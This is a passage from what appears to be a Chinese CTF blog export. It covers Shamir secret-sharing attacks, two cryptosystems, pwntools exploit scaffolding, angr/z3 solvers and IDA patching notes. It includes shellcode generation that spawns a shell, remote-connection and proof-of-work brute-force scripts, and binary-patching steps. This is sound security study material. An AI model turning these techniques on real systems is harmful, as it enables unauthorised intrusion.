ret = ret + rprint ret# 19s#Sage算系数P = PolynomialRing(GF(p), &#x27;x&#x27;)ret = P(0)for x, y in shares: r = P(1) * y for xx, yy in shares: if x != xx: r = r * P(&#x27;(x - %d) / (%d - %d)&#x27; % (xx, x, xx)) ret = ret + rprint ret[0]# 154s 除了 Lagrange 插值，也可以用矩阵。 可以将上面的方程组化为以下在 $\\text{GF}(p)$ 上的矩阵乘法： $\\left(\\begin {array}{c} 1 &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ 1 &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right) \\times \\left(\\begin {array}{c} s \\\\ a_1 \\\\ \\vdots \\\\ a_{k-1} \\end{array} \\right) = \\left(\\begin {array}{c} f(x_1) \\\\ f(x_2) \\\\ \\vdots \\\\ f{x_n} \\end{array} \\right)$ 1234567891011121314151617181920#Sage矩阵乘法k = 513n = 513x, y = zip(*shares)array_1 = []for i in range(n): for j in range(k): array_1.append(pow(x[i], j, p))A = matrix(GF(p), n, k, array_1)array_2 = []for i in range(n): array_2.append(y[i])B = matrix(GF(p), n, 1, array_2)a = A.solve_right(B)print a[0][0]# 266s 也可以将之视为多元同余方程组： $\\left\\{\\begin{array}{c} s+a_1x_1+a_2x_1^2+\\cdots+a_{k-1}x_1^{k-1} \\equiv f(x_1) \\pmod p \\\\ s+a_1x_2+a_2x_2^2+\\cdots+a_{k-1}x_2^{k-1} \\equiv f(x_2) \\pmod p \\\\ \\vdots \\\\ s+a_1x_n+a_2x_n^2+\\cdots+a_{k-1}x_n^{k-1} \\equiv f(x_n) \\pmod p \\end{array}\\right.$ 记系数矩阵的行列式为： $\\Delta = \\left \\vert \\begin {array}{c} 1 &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ 1 &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right \\vert \\neq 0$ 要求的是 $s$，因此将行列式第一列换为同余方程的值： $\\Delta_0 = \\left \\vert \\begin {array}{c} f(x_1) &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ f(x_2) &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ f(x_n) &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right \\vert \\neq 0$ 由克拉默法则得： $s \\equiv \\Delta^{-1}\\Delta_0 \\pmod p$ 1234567891011121314151617181920#Sagefx_num = 513x, y = zip(*shares)array_1 = []for i in range(fx_num): for j in range(fx_num): array_1.append(pow(x[i], j, p))delta = matrix(GF(p), fx_num, fx_num, array_1).determinant()array_2 = [_ for _ in array_1]for i in range(fx_num): array_2[i*fx_num] = y[i]delta_0 = matrix(GF(p), fx_num, fx_num, array_2).determinant() % pdelta_inverse = inverse_mod(int(delta), p)res = delta_inverse * delta_0 % pprint res# 1200s 但是如果维数很大，直接解行列式会很慢。观察发现 $\\Delta$ 其实是旋转后的范德蒙行列式。$\\Delta_0$ 是旋转后的范德蒙行列式的变形，第一行不是全 1，而是 $f(x)$。可以按第一行展开，余子式中将每一列除以该列元的一次方，可化为范德蒙行列式。计算速度会快非常多。 12345678910111213141516171819202122232425262728#Sagefx_num = 513x, y = zip(*shares)delta = 1for i in range(1, fx_num): for j in range(0, i): t = x[i] - x[j] delta = (delta * t) % pdelta_0 = 0for i in range(fx_num): tmp_x = [_ for _ in x] tmp_x.pop(i) yuzishi = -y[i] if (i+1+1) % 2 else y[i] for j in range(fx_num-1): yuzishi = (yuzishi * tmp_x[j]) % p for j in range(1, fx_num-1): for k in range(0, j): t = tmp_x[j] - tmp_x[k] yuzishi = (yuzishi * t) % p delta_0 = (delta_0 + yuzishi) % pdelta_inverse = gmpy2.invert(delta, p)res = delta_inverse * delta_0 % pprint res# 224s 攻击 如果在加密 2 段明文 $s_1,s_2$ 过程中，使用相同的随机数 $a$ 以及大素数 $p$，还能得到同一个 $x$ 对应的两个 $f(x)$，如果知道一个明文 $s_1$ 的情况下，可以算出另一个明文。 在 $\\text{GF}(p)$ 上：$s_1 + a_1x + a_2x^2 + a_3x^3 + … + a_{k-1}x^{k-1} = f(x)_1$ 设：$A = a_1x + a_2x^2 + a_3x^3 + … + a_{k-1}x^{k-1}$ 即： $s_1 + A = f(x)_1 \\\\ s_2 + A = f(x)_2$ 因此： $s_2 = f(x)_2 - f(x)_1 + s_1$ 如果不知道两个明文的情况下，但两明文有一定的线性关系，也可以算出两明文。 若 $s_2 = as_1 + b$，则有同余方程组： $\\left\\{ \\begin{array}{c} s_1 + A - f(x)_1 \\equiv 0 \\pmod p \\\\ s_2 + A - f(x)_2 \\equiv 0 \\pmod p\\\\ as_1 + b - s_2 \\equiv 0 \\pmod p \\end{array}\\right.$ 12345678910111213#Sagea = 99999999b = 123456PR.&lt;s1,s2,A&gt; = PolynomialRing(Zmod(p))f1 = s1 + A - y1f2 = s2 + A - y2f3 = a * s1 + b - s2Fs = [f1, f2, f3]I = Ideal(Fs)B = I.groebner_basis()print &#x27;s1 =&#x27;, ZZ(-B[0](0, 0, 0))print &#x27;s2 =&#x27;, ZZ(-B[1](0, 0, 0)) ​ Okamoto-Uchiyama密码系统1998年由Tatsuaki Okamoto和Shigenori Uchiyama提出的公钥加密算法。 条件：$n=p^2q$ 密钥生成 生成两个大素数 $p$ 和 $q$； 计算 $n=p^2q$； 选择一个随机整数 $g \\in \\{2, \\cdots ,n-1\\}$ 满足 $g^{p-1} \\not\\equiv 1 \\pmod {p^2}$； 计算 $h=g^n \\bmod n$。 公钥为 $(n,g,h)$，私钥为 $(p,q)$。 加密 明文 $m&lt;p$ 可以通过公钥 $(n,g,h)$ 加密： 选择一个随机整数 $r \\in \\{1,\\cdots,n-1\\}$； 计算 $c=g^m h^r \\bmod n$。 $c$ 即为 $m$ 的密文。 解密 密文 $c$ 可以通过私钥 $(p,q)$ 解密： 计算 $a=\\cfrac{(c^{p-1} \\bmod {p^2})-1}{p}$； 计算 $b=\\cfrac{(g^{p-1} \\bmod {p^2})-1}{p}$； 使用扩展欧几里得算法计算 $b$ 的模 $p$ 逆元 $b’=b^{-1} \\bmod p$； 计算 $m=ab’ \\bmod p$。 $m$ 即为 $c$ 的明文。 参考：PoseidonCTF 1st Edition 2020 - discrete log ​ Schmidt-Samoa密码系统2005年，Katja Schmidt-Samoa 创建了 Schmidt-Samoa 公钥密码体系。 与 Rabin 类似，它的安全性基于大整数分解的困难性。但 Rabin 解密时会得到四个解，而 Schmidt-Samor 得到的是唯一解。 密钥生成 选取大整数 $p,q$，计算 $N=p^2q$ 作为公钥。 计算 $d=\\text{inv}(N,\\varphi(pq))$ 作为私钥。 加密 对于小于 $pq$ 的明文 $m$，计算 $c=m^N \\bmod N$ 作为密文。 解密 对于密文 $c$，计算 $c^d \\bmod pq$，得到密文。 对于 $d$，当 $d=\\text{inv}(N,\\text{lcm}(p-1,q-1))$ 时，可以证明仍然有极大概率 $2^{N \\cdot d} \\equiv 2 \\pmod {pq}$。 因为 $\\text{lcm}(p-1,q-1)$ 已经是 $(p-1)(q-1)$ 非常大的因子，由拉格朗日定理，2生成的子群的阶应该是 $(p-1)(q-1)$ 的因数，所有概率还挺高的。 证明 首先，计算 $\\varphi(N)$，由欧拉函数的性质，显然有 $\\varphi(N)=\\varphi(p^2q)=p(p-1)(q-1)$ 于是 $x^{p(p-1)(q-1)} \\equiv 1 \\pmod N$ 尽管公钥、私钥都不包含 $pq$，但可以通过 $(N,d)$ 推出 $pq$，有 $N \\cdot d \\equiv 1 \\pmod {\\big((p-1)(q-1)\\big)}$ 随便选一个数2，来考察 $2^{N \\cdot d}$ 在模 $pq$ 时的表现，有 $2^{N \\cdot d} \\equiv 2^{N \\cdot d \\bmod {\\big((p-1)(q-1)\\big)}} \\equiv 2 \\pmod {pq}$ 从而 $pq \\mid 2^{N \\cdot d}-2$，于是计算 $\\gcd(2^{N \\cdot d}-2,N)$，即得到 $pq$。 容易发现，这些幂可以在模 $N$ 意义下计算，以节省复杂度。现在 $pq$ 到手，在模 $pq$ 意义下计算 $c^d$，即 $c^d \\equiv m^{N \\cdot d} \\equiv m^{N \\cdot d \\bmod {\\big((p-1)(q-1)\\big)}} \\equiv m \\pmod {pq}$ 至此完成解密。 参考：A New Rabin-type Trapdoor Permutation Equivalent to Factoring and Its Applications","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"}],"author":"Lazzaro"},{"title":"pwn工具","slug":"pwn-pwn工具","date":"2020-05-13T11:46:21.000Z","updated":"2022-10-14T14:49:06.385Z","comments":true,"path":"2020/05/13/pwn-pwn工具/","link":"","permalink":"https://lazzzaro.github.io/2020/05/13/pwn-pwn%E5%B7%A5%E5%85%B7/","excerpt":"","text":"​ pwntoolspwntools是一个CTF框架和漏洞利用开发库，用Python开发，旨在让使用者简单快速的编写exploit。 用法汇总导入与环境设置 1234567from pwn import * #导入包#os设置系统为linux系统#arch设置架构为32/64位#log_level设置日志输出的等级为debug（会将完整的io过程都打印下来，方便出现问题时排查错误）context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) 连接 123456# 第一种连接方式，通过ip和port去连接conn = remote(&#x27;127.0.0.1&#x27;, 8888)# 第二种连接方式，通过ssh连接shell = ssh(host=&#x27;192.168.14.144&#x27;, user=&#x27;root&#x27;, port=2222, password=&#x27;123456&#x27;)# 第三种连接方式，打开程序，开启进程p = process(&#x27;./reverse0&#x27;) 打包函数 p32/p64: 打包一个整数，分别打包为32位或64位u32/u64: 解包一个字符串，得到整数 123# 比如将0xdeadbeef进行32位的打包，将会得到&#x27;\\xef\\xbe\\xad\\xde&#x27;（小端序）payload = p32(0xdeadbeef) #pack 32 bits numberpayload = p64(0xdeadbeef) #pack 64 bits number 发送和接收数据 12345678conn.send(data) #发送数据conn.sendline(data) #发送一行数据，相当于在数据后面加\\nconn.recv(numb = 2048, timeout = default) #接收数据，numb制定接收的字节，timeout指定超时conn.recvline(keepends=True) #接受一行数据，keepends为是否保留行尾的\\nconn.recvuntil(&quot;Hello,World\\n&quot;,drop=false) #接受数据直到我们设置的标志出现conn.recvall() #一直接收直到 EOFconn.recvrepeat(timeout = default) #持续接受直到EOF或timeoutconn.interactive() #直接进行交互，相当于回到shell的模式，在取得shell之后使用 ELF模块 用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。 12345e = ELF(&#x27;/bin/cat&#x27;)print(hex(e.address)) # 获取文件装载的基地址print(hex(e.symbols[&#x27;write&#x27;])) # 获取函数地址（基于符号）print(hex(e.got[&#x27;write&#x27;])) # 获取函数got表的地址print(hex(e.plt[&#x27;write&#x27;])) # 获取函数plt表的地址 汇编与反汇编 12asm(&#x27;mov eax, 0&#x27;) #汇编disasm(&#x27;\\xb8\\x0b\\x00\\x00\\x00&#x27;) #反汇编 生成shellcode 先通过context设置架构，然后生成shellcode。 12context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) #设置环境shellcode = asm(shellcraft.sh()) #打印出汇编后的shellcode 调用gdb调试 在python文件中直接设置断点，当运行到该位置之后就会断下。 123from pwn import *p = process(&#x27;./c&#x27;)gdb.attach(p) Cyclic Pattern 使用pwntools生成一个pattern，pattern指一个字符串，可以通过其中的一部分数据去定位到其在一个字符串中的位置。 如，在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变为0x61616161，那么再通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。 123cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串cyclic_find(0x61616161) # 找到该数据在pattern中的位置cyclic_find(&#x27;aaaa&#x27;) # 查找位置也可以使用字符串去定位 ​ 常用脚本SHA / MD5 认证（Proof of Work） 1234567891011121314151617181920#python2 脚本1from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;34.74.30.191&quot;,1337)table = string.ascii_letters+string.digitsdef pow(): r.recvuntil(&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;XXXX: &#x27;, proof) pow()r.interactive() 123456789101112131415#python2 脚本2from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)r = remote(&quot;34.74.30.191&quot;,1337)data = r.recvline()prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvline()r.sendline(brute_force(prefix,s)) 1234567891011121314151617181920#python3from hashlib import sha256from itertools import productdata = r.recvline().decode()print(data)suffix = re.findall(r&#x27;\\(XXX\\+(.*?)\\)&#x27;, data)[0]digest = re.findall(r&#x27;== (.*?)\\n&#x27;, data)[0]print(f&quot;suffix: &#123;suffix&#125; \\ndigest: &#123;digest&#125;&quot;)print(&#x27;Calculating hash...&#x27;)dic = string.ascii_letters + string.digitsfor i in product(dic, repeat=3): prefix = &#x27;&#x27;.join(i) guess = prefix + suffix if sha256(guess.encode()).hexdigest() == digest: print(f&quot;result: &#123;guess&#125;\\n&quot;) breakr.sendlineafter(b&#x27;[+] Plz Tell Me XXX :&#x27;,prefix.encode()) ​ 模板12345678910111213141516171819202122232425262728293031323334353637#coding=utf8#python2from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;zsh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;info&#x27;# functions for quick scripts = lambda data :p.send(data)sa = lambda delim,data :p.sendafter(delim, data)sl = lambda data :p.sendline(data)sla = lambda delim,data :p.sendlineafter(delim, data)r = lambda numb=4096, timeout=2:p.recv(numb, timeout=timeout)rl = lambda :p.recvline()ru = lambda delims, drop=True :p.recvuntil(delims, drop)irt = lambda :p.interactive()dbg = lambda gs=&#x27;&#x27;, **kwargs :gdb.attach(p, gdbscript=gs, **kwargs)# misc functionsuu32 = lambda data :u32(data.ljust(4, &#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8, &#x27;\\x00&#x27;))leak = lambda name, addr :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))def rs(arg=[]): global p if arg == &#x27;remote&#x27;: p = remote(*host) else: p = binary.process(argv=arg, raw=True)#libc = ELF(&#x27;./libc-2.27.so&#x27;, checksec=False)binary = ELF(&#x27;./once&#x27;, checksec=False)host = (&#x27;182.92.108.71&#x27;, 30103)#rs()rs(&#x27;remote&#x27;)irt() ​ seccomp-tools当使用了 prctl 系统调用的 PR_SET_SECCOMP 功能禁用了一些系统调用，直接用 seccomp-tools 可以看禁用的系统调用。 seccomp-tools dump ./pwn","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"脚本","slug":"脚本","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"pwntools","slug":"pwntools","permalink":"https://lazzzaro.github.io/tags/pwntools/"}],"author":"Lazzaro"},{"title":"自动化工具","slug":"reverse-自动化工具","date":"2020-05-11T17:23:13.000Z","updated":"2022-11-09T13:31:13.588Z","comments":true,"path":"2020/05/12/reverse-自动化工具/","link":"","permalink":"https://lazzzaro.github.io/2020/05/12/reverse-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/","excerpt":"","text":"angrangr是一个二进制的代码分析工具, 能够自动化的完成二进制文件的分析并找出漏洞。可以进行动态的符号执行分析。 123456789import angrproj = angr.Project(&quot;./enormous&quot;)state = proj.factory.entry_state()sim = proj.factory.simulation_manager(state)sim.explore(find=(0x400000+0x3950), avoid=(0x400000+0x3963))if len(sim.found) &gt; 0: print(&quot;Yes&quot;) print(sim.found[0].posix.dumps(0)) ​ z3z3 是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题，功能强大且易于使用。z3 约束求解器是针对 Satisfiability modulo theories Problem 的一种通用求解器。所谓 SMT 问题，在 z3 环境下是指关于算术、位运算、数组等背景理论的一阶逻辑组合决定性问题。虽然 z3 功能强大，但是从理论上来说，大部分 SMT 问题的时间复杂度都过高，根本不可能在有限时间内解决。所以千万不要把 z3 想象得过于万能。 z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 z3。 z3 内置了多种变量类型，基本能覆盖常见计算机数据结构。包括整数、浮点数、BitVector、数组等。 z3 在默认情况下，只寻找满足所有条件的一组解，而不是找出所有解。 参考：Z3 API in Python 解简单方程 1234from z3 import *x = Int(&#x27;x&#x27;)y = Int(&#x27;y&#x27;)solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 求解实际案例 Solver()命令创建一个通用求解器。我们可以通过add函数添加约束条件。我们称之为声明约束条件。check()函数解决声明的约束条件，sat结果表示找到某个合适的解，unsat结果表示没有解。这时候我们称约束系统无解。最后，求解器可能无法解决约束系统并返回未知作为结果。 常用的数据类型： BitVec - 至特定大小的数据类型 Int - 整型 Real - 有理数 Bool - 布尔类型 Array - 数组 常用函数： LShR(x, 1) - 逻辑右移（用0填充，&gt;&gt; 为算术右移） 例1： 1234567891011from z3 import *a1, a2, a3, a4, a5, a6 = Ints(&quot;a1 a2 a3 a4 a5 a6&quot;)x = Solver()x.add(a1 * 3 + a2 * 2 + a3 * 5 == 1003)x.add(a1 * 4 + a2 * 7 + a3 * 9 == 2013)x.add(a1 + a2 * 8 + a3 * 2 == 1109)x.add(a4 * 3 + a5 * 2 + a6 * 5 == 671)x.add(a4 * 4 + a5 * 7 + a6 * 9 == 1252)x.add(a4 + a5 * 8 + a6 * 2 == 644)x.check()print(x.model()) 例2： 1234567891011121314151617181920212223242526272829from z3 import *so = Solver()flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(36)]a = [i for i in flag]b = [i for i in range(36)]c = [0 for i in range(36)]d = [0x12027,0x0F296,0x0BF0E,0x0D84C,0x91D8,0x297,0x0F296,0x0D830,0x0A326,0x0B010,0x7627,0x230,0x0BF0E,0x0A326,0x8FEB,0x879D,0x70C3,0x1BD,0x0D84C,0x0B010,0x879D,0x0B00D,0x6E4F,0x1F7,0x91D8,0x7627,0x70C3,0x6E4F,0x9BDC,0x15C,0x297,0x230,0x1BD,0x1F7,0x15C,0x6]for i in range(6): for j in range(6): b[i+6*j] = a[6*i+j]for i in range(6): for j in range(6): for k in range(6): c[j+6*i] = c[j+6*i] + a[6*i+k]*b[6*k+j] so.add(simplify(c[j+6*i]) == d[j+6*i])for i in range(6,36-10): so.add(flag[i]&gt;=32) so.add(flag[i]&lt;=127)for i in range(6): so.add(flag[i] == ord(&#x27;whctf&#123;&#x27;[i]))for i in range(36-9,36): so.add(flag[i] == 0x1)so.add(flag[-10] == ord(&#x27;&#125;&#x27;))if so.check() == sat: m = so.model() print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag))else: print(&#x27;Error&#x27;)","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"https://lazzzaro.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"angr","slug":"angr","permalink":"https://lazzzaro.github.io/tags/angr/"},{"name":"z3","slug":"z3","permalink":"https://lazzzaro.github.io/tags/z3/"}],"author":"Lazzaro"},{"title":"IDA笔记","slug":"reverse-IDA笔记","date":"2020-05-11T17:18:41.000Z","updated":"2022-11-23T15:03:17.686Z","comments":true,"path":"2020/05/12/reverse-IDA笔记/","link":"","permalink":"https://lazzzaro.github.io/2020/05/12/reverse-IDA%E7%AC%94%E8%AE%B0/","excerpt":"","text":"常用快捷键Shift+F12：查看所有字符串 F5：查看伪代码 Alt+T：查找字符串 空格：切换图形视图&amp;汇编视图 /：在反编译后伪代码的界面中写下注释 x：对着某个函数、变量按该快捷键，可以查看它的交叉引用 ​ 位操作123456def LOBYTE(x): return x &amp; 0xffdef HIBYTE(x): return (x &gt;&gt; 8) &amp; 0xffdef LOWORD(x): return x &amp; 0xffffdef HIWORD(x): return (x &gt;&gt; 16) &amp; 0xffffdef LODWORD(x): return x &amp; 0xffffffffdef HIDWORD(x): return (x &gt;&gt; 32) &amp; 0xffffffff ​ 其他操作导出array为数组右键array变量名 → 转为dword → Export as → C unsigned char array (hex) ​ 手动修复栈指针（Decompilation failure: positive sp value has been found）现象：无法反编译 修复： 对标红位置按 Alt+K 修改栈偏移： 修改后 F5 即可。 ​ 手动修改汇编或二进制代码（Patch） 激活功能 Edit▶Patch Program菜单GUI版本的IDA的一项隐藏功能，用户需要编辑idagui.cfg配置文件才能激活该菜单。 改字节（Change word） IDA——Edit——Patch Program——Change word 用于编辑IDA数据库中的字节值。这个对话框显示了从光标所在位置开始的16个字节的值。你可以更改显示的部分或全部字节。同时,Address表示了虚拟地址，File offset表示了文件偏移量。 实际上，Hex View可以直接改字节，右键Edit即可。 改内容（Assemble） IDA——Edit——Patch Program——Assemble 利用“汇编”选项可以输入使用一个内部汇编器汇编的汇编语言语句。然后，IDA会将得到的指令字节写入当前的屏幕位置。 应用修改（Apply patches to input file） IDA——Edit——Patch Program——Apply patches to input file 把改动更新到二进制文件中。 ​ 手动定义为函数（恢复伪代码）来到一处看似很像关键代码处的位置： 在这部分代码的头部按 P 键定义为函数，接着尝试查看伪代码，得到的伪代码没有变量识别，非常难看。 于是我们尝试修复堆栈信息，让 IDA 能够识别出来变量。 如图所示，我们可以尝试着在这部分之上使用 Keypatch 手动加入一个 push rbp; mov rbp, rsp 让 IDA 能够识别出堆栈上的变量，紧接着再 F5，就可以看到比较舒服的伪代码了。 Dump代码生成新脚本使用IDA Pro调试程序时偶尔会遇到dump内存的需求，IDA Pro并没有直接提供内存dump的功能，但可以通过其提供的接口用脚本来实现相关功能。 IDC脚本1234auto i,fp;fp = fopen(&quot;d:\\\\dump.dex&quot;,&quot;wb&quot;);for (i = start_address; i &lt;= end_address; i++) fputc(Byte(i),fp); Python脚本12345import idaapidata = idaapi.dbg_read_memory(start_address, data_length)fp = open(&#x27;d:\\\\dump&#x27;, &#x27;wb&#x27;)fp.write(data)fp.close() ​ 异常处理选择本地Windows调试器后点击debugger选项卡中的debugger options，选择左下角的edit exceptions，如触发了除零异常，可以找到整数除零异常（EXCEPTION_INT_DIVIDE_BY_ZERO)，选择pass to application和silent，下断调试即可。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://lazzzaro.github.io/tags/IDA/"}],"author":"Lazzaro"},{"title":"crypto常用工具","slug":"crypto-crypto常用工具","date":"2020-05-10T14:41:00.000Z","updated":"2022-11-27T16:41:31.852Z","comments":true,"path":"2020/05/10/crypto-crypto常用工具/","link":"","permalink":"https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/","excerpt":"","text":"常用工具 古典密码 维吉尼亚密码（Vigenere）： https://github.com/atomcated/Vigenere（加密解密程序，包含自动猜测密钥功能） https://www.guballa.de/vigenere-solver whitespace语言： https://ideone.com/ ​ gmpy2123456789import gmpy2gmpy2.mpz(n) #初始化一个大整数gmpy2.mpfr(x) # 初始化一个高精度浮点数xd = gmpy2.invert(e,n) # 求逆元，de = 1 mod nc = gmpy2.powmod(m,e,n) # 幂取模，结果是 c = m^e mod ngmpy2.is_prime(n) #素性检测gmpy2.gcd(a,b) #欧几里得算法，最大公约数gmpy2.gcdext(a,b) #扩展欧几里得算法gmpy2.iroot(x,n) #x开n次根 ​ Sage定义 123456R.&lt;X&gt; = PolynomialRing(Zmod(n))#Zmod(n):指定模，定义界限为n的环；Z表示整数；指定模是划定这个环的界限，就是有效的数字只有从0到n，其他的都通过与n取模来保证在0～n这个范围内；Zmod代表这是一个整数域中的n模环#ZZ：整数环；QQ：有理数环；RR：实数环；CC：复数环#R：只是一个指针，指向用polynomialring指定的那个环（可以使用任意字符）#PolynomialRing：这个就是说建立多项式环#.&lt;X&gt;：指定一个变量的意思（可以用任意字符） ​ 数论 12345678prime_pi(n) #小于等于n的素数个数divisors(n) #n的因子number_of_divisors(n) #n的因子数factor(n) #n的因式分解euler_phi(n) #n的欧拉函数值two_squares(n) #n的两数平方组合three_squares(n) #n的三数平方组合four_squares(n) #n的四数平方组合 ​ 多项式 12345678910111213141516171819202122232425262728293031323334f.subs(&#123;x:x1&#125;) #把x1值代入xf.univariate_polynomial() #映射为单变量多项式f.univariate_polynomial().roots() #单变量多项式求根f.coefficients() #多项式系数列表f.list() #多项式系数f.monic() #首一多项式#因式分解（单元）x = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()f = (x^3 - 1)^2-(x^2-1)^2f.factor()#因式分解（二元）x, y = PolynomialRing(RationalField(), 2, [&#x27;x&#x27;,&#x27;y&#x27;]).gens()f = (9*y^6 - 9*x^2*y^5 - 18*x^3*y^4 - 9*x^5*y^4 + 9*x^6*y^2 + 9*x^7*y^3 + 18*x^8*y^2 - 9*x^11)f.factor()#GCD（单元）x = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()f = 3*x^3 + xg = 9*x*(x+1)f.gcd(g)#GCD（多元）R.&lt;x,y,z&gt; = PolynomialRing(RationalField(), order=&#x27;lex&#x27;)f = 3*x^2*(x+y)g = 9*x*(y^2 - x^2)f.gcd(g)#多项式/整数转换PR = PolynomialRing(GF(2),&#x27;x&#x27;)R.&lt;x&gt; = GF(2^2049)pc = R.fetch_int(xx) #整数转多项式xx = R(PR(pc)).integer_representation() #多项式转整数 ​ 矩阵 1234567891011121314151617181920A = matrix(ZZ, [[1,1],[0,4]])A.nrows() #行数A.ncols() #列数A.transpose() #转置A.inverse() 或 A^(-1) #逆A.rank() #秩A.det() #行列式A.stack(vector([1,2])) #矩阵后添加一行A.insert_row(1, vector([1,2])) #在第一行插入A.change_ring(QQ) #更换环为QQA.solve_left(B) 或 A/B #求解XA=BA.solve_right(B) 或 A\\B #求解AX=BA.left_kernel() #求解XA=0，线性相关的行向量A.right_kernel() #求解AX=0，线性相关的行向量A.LLL() #最短正交基A.multiplicative_order() #乘法阶zero_matrix(2,3) #2*3零矩阵identity_matrix(2,3) #2*3单位阵block_matrix(QQ,[[A,zero_matrix(n,1)],[matrix(b),matrix([1e-16])]]) #矩阵拼接 ​ 解方程 $\\begin{cases} x+y=10 \\\\ xy=21 \\end{cases} $ 12var(&#x27;x y&#x27;)solve([x+y==10,x*y==21],[x,y]) ​ 解线性方程组 $AX=B$ 123456A = Matrix([[1,2,3],[3,2,1],[1,1,1]]) Y = vector([0,-4,-1]) X = A.solve_right(Y)#或A \\ Y#反斜杠 \\ 可以代替 solve_right; 用 A \\ Y 代替 A.solve right(Y). ​ 求逆元 $ed=1\\pmod {\\varphi(n)}$ 1d = inverse_mod(e,fn) # sage求逆元 ​ 扩展欧几里得算法 12d,u,v=xgcd(20,30)print(&quot;d:&#123;0&#125; u:&#123;1&#125; v:&#123;2&#125;&quot;.format(d,u,v)) #d:10 u:-1 v:1 ​ CRT（中国剩余定理） $\\begin{cases} x\\equiv2\\pmod3 \\\\ x\\equiv3\\pmod5 \\\\ x\\equiv2\\pmod7 \\end{cases} $ 1crt([2,3,2],[3,5,7]) 123456789#仅适用模两两互素def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 ​ 离散对数 $a^x \\equiv b \\pmod {n}$ 1234567891011#n为合数（Pohlig-Hellman）x = discrete_log(mod(b,n),mod(a,n)) #n为质数或质数幂（线性筛Index Calculus）R = Integers(99)a = R(4)b = a^9b.log(a)x = int(pari(f&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;))x = gp.znlog(b, gp.Mod(a, n)) ​ 欧拉函数 $\\varphi(x)=x\\prod\\limits_{i=1}^n(1-\\frac{1}{p_i})$ 1print(euler_phi(71)) #70 ​ 整数域椭圆曲线 $y^2=x^3+a_4x+a_6$ 输出所有整数点 12345678910111213141516#素数域F = GF(7)#素数域的阶print(F.order())#椭圆曲线E7(2,3)E = EllipticCurve(F,[0,0,0,2,3])#基点坐标G = E.gens()[0]#阶（不同的离散的点个数）q = 